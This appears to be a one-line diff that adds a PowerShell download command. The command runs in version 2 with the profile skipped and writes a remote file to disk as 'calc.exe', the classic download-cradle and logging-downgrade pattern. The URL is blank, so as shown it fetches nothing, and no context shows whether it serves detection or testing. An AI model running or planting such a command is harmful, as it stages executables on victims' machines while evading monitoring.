@@ -1,0 +1,1 @@
+powershell -version 2 -nop -NoLogo -Command "(new-object System.Net.WebClient).DownloadFile('', 'calc.exe')"
